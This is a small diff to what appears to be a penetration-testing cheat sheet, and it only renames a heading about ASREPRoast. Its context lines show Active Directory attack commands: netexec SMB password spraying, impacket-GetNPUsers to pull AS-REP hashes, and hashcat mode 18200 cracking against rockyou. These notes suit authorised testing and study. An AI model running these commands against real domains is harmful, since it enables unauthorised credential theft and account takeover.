@@ -113,7 +113,7 @@ netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
 impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
 ```
 
-## Crack ASREPRoast hashes with hashcat
+## Hashcat ASREPRoast
 ```bash
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
